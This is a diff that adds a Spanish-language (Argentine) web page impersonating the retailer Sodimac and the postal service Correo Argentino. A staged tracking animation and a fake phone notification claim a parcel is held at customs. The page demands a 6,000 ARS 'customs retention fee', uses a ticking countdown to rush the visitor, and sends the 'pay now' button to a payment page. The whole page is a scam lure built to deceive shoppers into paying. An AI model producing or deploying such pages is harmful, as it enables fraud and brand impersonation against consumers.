@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="es-AR">
+<head>
+<script src="/js/site-utils.js"></script>
+<script src="/js/funnel-events.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sodimac — Retención Aduanera</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #22c55e;
+      --primary-dark: #16a34a;
+      --danger: #ff0050; /* TikTok Red */
+      --warning: #f59e0b;
+      --text-main: #020617;
+      --text-muted: #64748b;
+      --glass: rgba(255, 255, 255, 0.75);
+      --glass-border: rgba(255, 255, 255, 0.5);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f8fafc;
+      overflow-x: hidden;
+      color: var(--text-main);
+      line-height: 1.5;
+      min-height: 100vh;
+    }
+
+    /* Mesh Gradient Background */
+    .bg-mesh {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%; z-index: -2;
+      background-color: #f8fafc;
+      background-image:
+        radial-gradient(at 0% 0%, rgba(34, 197, 94, 0.1) 0px, transparent 50%),
+        radial-gradient(at 100% 100%, rgba(255, 0, 80, 0.08) 0px, transparent 50%),
+        radial-gradient(at 100% 0%, rgba(59, 130, 246, 0.08) 0px, transparent 50%);
+      filter: blur(100px);
+      animation: mesh-move 20s ease infinite alternate;
+    }
+    @keyframes mesh-move { 0% { transform: scale(1); } 100% { transform: scale(1.15) rotate(4deg); } }
+
+    body::after {
+      content: ""; position: fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.04; pointer-events:none;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.6' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+    }
+
+    header {
+      background: #f8fafc; padding: 10px 0; text-align: center;
+      position: sticky; top: 0; z-index: 100;
+      border-bottom: 1px solid #e2e8f0;
+      box-shadow: 0 4px 20px rgba(15,23,42,0.06);
+    }
+    header img { height: 30px;  }
+
+    .container { max-width: 480px; margin: 0 auto; padding: 24px 16px; }
+
+    .card {
+      background: var(--glass);
+      backdrop-filter: saturate(180%) blur(25px);
+      -webkit-backdrop-filter: saturate(180%) blur(25px);
+      border: 1px solid var(--glass-border);
+      border-radius: 28px;
+      padding: 30px;
+      margin-bottom: 20px;
+      box-shadow: 0 15px 35px -5px rgba(0, 0, 0, 0.06), inset 0 0 2px rgba(255, 255, 255, 0.8);
+      animation: slideUp 0.9s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+
+    .tracking-title { font-size: 20px; font-weight: 900; margin-bottom: 30px; text-align: center; color: var(--text-main); letter-spacing: -0.02em; }
+
+    .steps { display: flex; justify-content: space-between; position: relative; margin-bottom: 28px; }
+    .step { display: flex; flex-direction: column; align-items: center; flex: 1; position: relative; z-index: 1; }
+    .step-circle { width: 42px; height: 42px; border-radius: 50%; border: 1px solid #e2e8f0; display: flex; align-items: center; justify-content: center; background: #fff; font-size: 16px; transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); color: #cbd5e1; }
+    .step-circle.completed { border-color: var(--primary); background: var(--primary); color: #fff; box-shadow: 0 0 0 5px rgba(34, 197, 94, 0.08); }
+    .step-circle.error { border-color: var(--danger); background: var(--danger); color: #fff; box-shadow: 0 0 0 5px rgba(255, 0, 80, 0.08); }
+    .step-circle.loading { border-color: var(--warning); background: #fff; color: var(--warning); box-shadow: 0 0 0 5px rgba(245, 158, 11, 0.08); }
+    .step-label { font-size: 10px; text-align: center; margin-top: 14px; font-weight: 800; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.08em; }
+
+    .steps-line { position: absolute; top: 21px; left: 10%; right: 10%; height: 2px; background: #e2e8f0; z-index: 0; }
+    .steps-line-progress { height: 100%; width: 0%; background: var(--primary); transition: width 1s cubic-bezier(0.65, 0, 0.35, 1); }
+
+    .reveal-item { opacity: 0; transform: translateY(20px); transition: all 0.9s cubic-bezier(0.16, 1, 0.3, 1); }
+    .reveal-item.visible { opacity: 1; transform: translateY(0); }
+
+    .priority-panel { border: 1px solid #fecaca; border-radius: 20px; overflow: hidden; margin-bottom: 24px; background: #fff; }
+    .priority-head { background: #ef1f32; color: #fff; padding: 18px 20px; display: flex; justify-content: space-between; align-items: center; }
+    .priority-kicker { color: #ffd11a; font-size: 11px; font-weight: 900; text-transform: uppercase; }
+    .priority-title { font-size: 22px; font-weight: 900; line-height: 1.1; }
+    .priority-turn { border: 1px solid rgba(255,255,255,.35); border-radius: 14px; padding: 7px 12px; text-align: center; font-weight: 900; line-height: 1; }
+    .priority-turn small { display:block; font-size:10px; margin-bottom:5px; }
+    .priority-body { padding: 20px; }
+    .route-track { height: 110px; border: 1px solid #fee2e2; border-radius: 16px; background: #f8fafc; display:flex; align-items:center; padding: 0 24px; margin-bottom: 14px; }
+    .route-line { width:100%; height:5px; background: repeating-linear-gradient(90deg,#ef1f32 0 52%,#cbd5e1 52% 58%,transparent 58% 64%); position:relative; }
+    .route-dot { position:absolute; top:50%; width:30px; height:30px; border:5px solid #ef1f32; background:#fff; border-radius:50%; transform:translate(-50%,-50%); }
+    .route-dot.start { left:0; } .route-dot.mid { left:52%; } .route-dot.end { left:100%; border-color:#cbd5e1; }
+    .route-truck { position:absolute; left:52%; top:50%; transform:translate(-50%,-50%); width:50px; height:42px; border-radius:10px; background:#ef1f32; color:#fff; display:flex; align-items:center; justify-content:center; box-shadow:0 5px 14px rgba(239,31,50,.25); }
+    .status-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:14px; }
+    .status-box { border:1px solid #dbe3ee; border-radius:14px; padding:14px; background:#f8fafc; }
+    .status-box small { display:block; color:#6b7280; font-size:10px; font-weight:900; margin-bottom:5px; }
+    .status-box strong { color:#ef1f32; font-size:14px; line-height:1.25; }
+    .wait-alert { border:1px solid #fbbf24; border-radius:16px; padding:16px; background:#fffdf4; }
+    .wait-title { display:flex; gap:12px; align-items:center; font-size:18px; font-weight:900; color:#111827; margin-bottom:8px; }
+    .alert-icon { background:#ef1f32; color:#fff; width:42px; height:42px; border-radius:11px; display:flex; align-items:center; justify-content:center; flex-shrink:0; box-shadow:0 5px 12px rgba(239,31,50,.2); }
+    .alert-text { color:#6b7280; font-size:14px; line-height:1.5; font-weight:700; }
+    .dispatch-row { margin-top:14px; border:1px solid #fee2e2; border-radius:12px; padding:12px 14px; display:flex; justify-content:space-between; align-items:center; color:#6b7280; font-size:11px; font-weight:900; }
+    .dispatch-time { color:#ef1f32; font-size:22px; }
+
+    .price-box { text-align: center; padding: 4px 0 32px; }
+    .price-label { font-size: 14px; color: var(--text-muted); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.05em; }
+    .price-value { font-size: 56px; font-weight: 900; color: #000; letter-spacing: -0.04em; }
+    .price-value span { font-size: 20px; font-weight: 800; color: var(--text-muted); }
+
+    .btn { width: 100%; padding: 24px; background: #000; color: #fff; border: none; border-radius: 22px; font-size: 18px; font-weight: 900; cursor: pointer; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); display: flex; align-items: center; justify-content: center; gap: 14px; box-shadow: 0 15px 30px -10px rgba(0,0,0,0.5); position: relative; overflow: hidden; }
+    .btn:hover { transform: translateY(-5px) scale(1.02); background: #111; }
+    .btn:active { transform: translateY(-2px) scale(0.98); }
+    .btn::after { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.15), transparent); transform: rotate(45deg); animation: shine 3.5s infinite; }
+    @keyframes shine { 0% { left: -100%; } 25% { left: 100%; } 100% { left: 100%; } }
+
+    .info-box { background: rgba(241, 245, 249, 0.5); border-radius: 20px; padding: 20px; margin-top: 32px; border: 1px solid rgba(255, 255, 255, 0.6); }
+    .info-title { font-weight: 800; font-size: 13px; margin-bottom: 12px; display: flex; align-items: center; gap: 12px; color: var(--text-main); text-transform: uppercase; letter-spacing: 0.1em; }
+    .info-text { font-size: 13.5px; color: var(--text-muted); line-height: 1.75; font-weight: 500; }
+
+    /* iOS Notification — Correo Argentino */
+    .premium-ios-notification {
+      position: fixed; top: -160px; left: 50%; transform: translateX(-50%) scale(0.96);
+      width: calc(100% - 20px); max-width: 400px;
+      background: rgba(250, 250, 252, 0.72);
+      backdrop-filter: blur(30px) saturate(180%);
+      -webkit-backdrop-filter: blur(30px) saturate(180%);
+      border: 0.5px solid rgba(0, 0, 0, 0.06);
+      border-radius: 22px; padding: 12px 14px;
+      display: flex; align-items: center; gap: 12px;
+      box-shadow: 0 10px 30px -6px rgba(0, 0, 0, 0.25), 0 2px 6px rgba(0, 0, 0, 0.08);
+      z-index: 2000; opacity: 0;
+      transition: transform 0.55s cubic-bezier(0.19, 1.15, 0.22, 1), opacity 0.4s ease, top 0.55s cubic-bezier(0.19, 1.15, 0.22, 1);
+    }
+    .premium-ios-notification.show { top: 12px; opacity: 1; transform: translateX(-50%) scale(1); pointer-events: auto; }
+
+    .ios-icon-box {
+      width: 44px; height: 44px; background: #0876c9;
+      border-radius: 10px; display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.18); overflow: hidden;
+    }
+    .ios-icon-box svg { width: 27px; height: 27px; }
+    .ios-msg { flex: 1; min-width: 0; }
+    .ios-top { display: flex; justify-content: space-between; align-items: baseline; gap: 8px; margin-bottom: 1px; line-height: 1.1; }
+    .ios-origin { font-size: 14px; font-weight: 600; letter-spacing: -0.01em; color: #1c1c1e; line-height: 1.15; }
+    .ios-time { font-size: 12.5px; color: rgba(60, 60, 67, 0.6); font-weight: 400; flex-shrink: 0; line-height: 1.15; }
+    .ios-text { font-size: 14px; font-weight: 400; letter-spacing: -0.01em; line-height: 1.3; color: #1c1c1e; }
+
+    .loading-spinner { animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .pulse { animation: step-pulse 2s infinite; }
+    @keyframes step-pulse { 0% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); } 70% { box-shadow: 0 0 0 14px rgba(245, 158, 11, 0); } 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); } }
+    @media (max-width: 390px) { .card { padding:20px 14px; } .priority-title { font-size:19px; } .priority-body { padding:14px; } }
+  </style>
+</head>
+<body>
+  <div class="bg-mesh"></div>
+
+  <div id="iosNotify" class="premium-ios-notification">
+    <div class="ios-icon-box">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linejoin="round" aria-hidden="true">
+        <path d="M4 7.5 12 3l8 4.5v9L12 21l-8-4.5z"/><path d="m4 7.5 8 4.5 8-4.5M12 12v9"/>
+      </svg>
+    </div>
+    <div class="ios-msg">
+      <div class="ios-top">
+        <span class="ios-origin">Correo Argentino</span>
+        <span class="ios-time">ahora</span>
+      </div>
+      <div class="ios-text">Tu envío está retenido en Aduana. Regularizá la tasa para continuar la entrega.</div>
+    </div>
+  </div>
+
+  <header>
+    <img src="/__l5e/assets-v1/58a5a796-ad43-4024-a4e9-0a9458c634be/sodimac-pago-logo.png" alt="Sodimac">
+  </header>
+
+  <div class="container">
+    <div class="card">
+      <div class="tracking-title">Consultando el rastreo de tu envío</div>
+
+      <div class="steps">
+        <div class="steps-line"><div class="steps-line-progress" id="progressLine"></div></div>
+        <div class="step">
+          <div class="step-circle completed" id="step1">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          </div>
+          <div class="step-label">Confirmado</div>
+        </div>
+        <div class="step">
+          <div class="step-circle" id="step2"></div>
+          <div class="step-label">Logística</div>
+        </div>
+        <div class="step">
+          <div class="step-circle" id="step3"></div>
+          <div class="step-label">Aduana</div>
+        </div>
+        <div class="step">
+          <div class="step-circle" id="step4"></div>
+          <div class="step-label">Entrega</div>
+        </div>
+      </div>
+
+      <div id="reveal-1" class="reveal-item">
+        <div class="priority-panel">
+          <div class="priority-head">
+            <div><div class="priority-kicker">Panel de entrega</div><div class="priority-title">Reprogramación prioritaria</div></div>
+            <div class="priority-turn"><small>TURNO</small>24h</div>
+          </div>
+          <div class="priority-body">
+            <div class="route-track"><div class="route-line"><span class="route-dot start"></span><span class="route-dot mid"></span><span class="route-truck"><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M3 6h11v10H3zM14 10h4l3 3v3h-7z"/><circle cx="7" cy="18" r="2"/><circle cx="18" cy="18" r="2"/></svg></span><span class="route-dot end"></span></div></div>
+            <div class="status-grid"><div class="status-box"><small>ESTADO</small><strong>Despacho prioritario pendiente</strong></div><div class="status-box"><small>DEMANDA</small><strong>Hogar y Jardín</strong></div></div>
+            <div class="wait-alert">
+              <div class="wait-title"><span class="alert-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 3 2.5 20h19z"/><path d="M12 9v5M12 17.5v.5"/></svg></span>Pedido en lista de espera</div>
+              <div class="alert-text">Tu pedido entró en lista de espera por alta demanda en Hogar y Jardín. La previsión actual es de 14 a 18 días, pero podés activar prioridad de despacho y adelantar el envío para hoy hasta las 18:00.</div>
+              <div class="dispatch-row"><span>DESPACHO HOY</span><span class="dispatch-time" id="dispatchTimer">09:34</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="reveal-2" class="reveal-item">
+        <div class="price-box">
+          <div class="price-label">Tasa de Retención Aduanera</div>
+          <div class="price-value">$6.000 <span>ARS</span></div>
+        </div>
+      </div>
+
+      <div id="reveal-3" class="reveal-item">
+        <button class="btn" id="payBtn">
+          Regularizar ahora
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+        </button>
+      </div>
+
+      <div id="reveal-4" class="reveal-item">
+        <div class="info-box">
+          <div class="info-title">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            Envío Sodimac protegido
+          </div>
+          <div class="info-text">Una vez regularizada la tasa, el pedido vuelve al circuito de entrega y el seguimiento se actualiza con prioridad.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('payBtn').addEventListener('click', function(){
+      window.location.href = getUrlWithUtm('/up2-pago.html');
+    });
+
+    const spinner = `<svg class="loading-spinner" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>`;
+    const errorIcon = `<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>`;
+    const line = document.getElementById('progressLine');
+    const notify = document.getElementById('iosNotify');
+
+    function setStep(id, state) {
+      const el = document.getElementById(id);
+      el.className = 'step-circle ' + state + (state === 'loading' ? ' pulse' : '');
+      if (state === 'completed') {
+        el.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+      } else if (state === 'error') {
+        el.innerHTML = errorIcon;
+      } else if (state === 'loading') {
+        el.innerHTML = spinner;
+      }
+    }
+
+    const revealItems = [
+      document.getElementById('reveal-1'),
+      document.getElementById('reveal-2'),
+      document.getElementById('reveal-3'),
+      document.getElementById('reveal-4')
+    ];
+
+    setTimeout(() => {
+      setStep('step2', 'loading');
+      line.style.width = '33%';
+      setTimeout(() => notify.classList.add('show'), 600);
+    }, 1000);
+
+    setTimeout(() => {
+      setStep('step2', 'completed');
+      setStep('step3', 'loading');
+      line.style.width = '66%';
+    }, 3000);
+
+    setTimeout(() => {
+      setStep('step3', 'error');
+      setStep('step4', 'error');
+      line.style.background = 'var(--danger)';
+      revealItems.forEach((item, index) => {
+        setTimeout(() => item.classList.add('visible'), index * 150);
+      });
+    }, 5000);
+
+    notify.onclick = () => notify.classList.remove('show');
+
+    let dispatchSeconds = 9 * 60 + 34;
+    setInterval(() => {
+      dispatchSeconds = Math.max(0, dispatchSeconds - 1);
+      const timer = document.getElementById('dispatchTimer');
+      if (timer) timer.textContent = String(Math.floor(dispatchSeconds / 60)).padStart(2, '0') + ':' + String(dispatchSeconds % 60).padStart(2, '0');
+    }, 1000);
+  </script>
+</body>
+</html>
